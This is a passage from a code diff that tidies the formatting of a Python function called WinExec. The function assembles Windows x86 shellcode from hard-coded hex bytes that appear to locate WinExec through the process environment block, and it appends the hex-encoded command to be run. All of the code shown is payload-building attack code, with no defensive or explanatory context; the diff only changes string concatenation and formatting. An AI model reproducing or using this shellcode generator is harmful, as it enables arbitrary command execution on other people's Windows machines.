@@ -4,17 +4,16 @@ import codecs
 
 def WinExec(command):
     from re import findall
-    fill = "31c9b957696e45eb0431c9eb0031c"
-    fill += "031db31d231ff31f6648b7b308b7f0"
+    fill = "31c9b957696e45eb0431c9eb0031c" + "031db31d231ff31f6648b7b308b7f0"
     fill += "c8b7f1c8b47088b77208b3f807e0c3"
     fill += "375f289c703783c8b577801c28b7a2"
     fill += "001c789dd81f957696e45753b8b34a"
     fill += "f01c645390e75f68b7a2401c7668b2"
     fill += "c6f8b7a1c01c78b7caffc01c789d9b1ff53e2fd"
     if len(command) == 4:
-        stack = "%s" % (codecs.encode(command, 'hex'))
-        data = findall("..?", stack)				
-        fill += "68" + "".join(data)				
+        stack = f"{codecs.encode(command, 'hex')}"
+        data = findall("..?", stack)
+        fill += "68" + "".join(data)
     else:											
         if len(command) % 4 == 3:										
             padd = "\x20"							
